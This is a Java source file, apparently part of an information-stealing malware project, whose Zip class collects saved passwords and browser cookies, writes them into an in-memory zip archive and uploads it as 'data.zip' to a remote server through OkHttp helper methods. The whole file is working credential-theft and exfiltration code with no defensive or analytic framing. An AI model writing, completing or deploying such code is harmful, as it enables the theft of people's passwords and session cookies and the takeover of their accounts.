package io.github.luxotick.impl;

import io.github.luxotick.Sender;
import io.github.luxotick.Start;
import io.github.luxotick.impl.cookies.sendCookies;
import io.github.luxotick.impl.Passwords;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.RequestBody;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;
import java.util.Map;
import java.util.zip.*;

public class Zip {
    public static void main(String[] args) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ZipOutputStream zipOut = new ZipOutputStream(baos);

        // Get passwords and cookies
        Map<String, byte[]> cookies = new sendCookies().zaa();

        // Add passwords to zip
        zipOut.putNextEntry(new ZipEntry("Passwords.txt"));
        zipOut.write(Start.aaaa.getBytes(StandardCharsets.UTF_8));
        zipOut.closeEntry();

        // Add cookies to zip
        for (Map.Entry<String, byte[]> entry : cookies.entrySet()) {
            zipOut.putNextEntry(new ZipEntry(entry.getKey() + ".txt"));
            zipOut.write(entry.getValue());
            zipOut.closeEntry();
        }

        zipOut.close();
        byte[] zipData = baos.toByteArray();

        // Send the zip data
        OkHttpClient client = new OkHttpClient();
        RequestBody requestBody = RequestBody.create(zipData, MediaType.parse("application/octet-stream"));
        Sender.sendFile(client, new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", "data.zip", requestBody)
                .build());
        Sender.sendToServer(zipData, "data.zip");
    }
}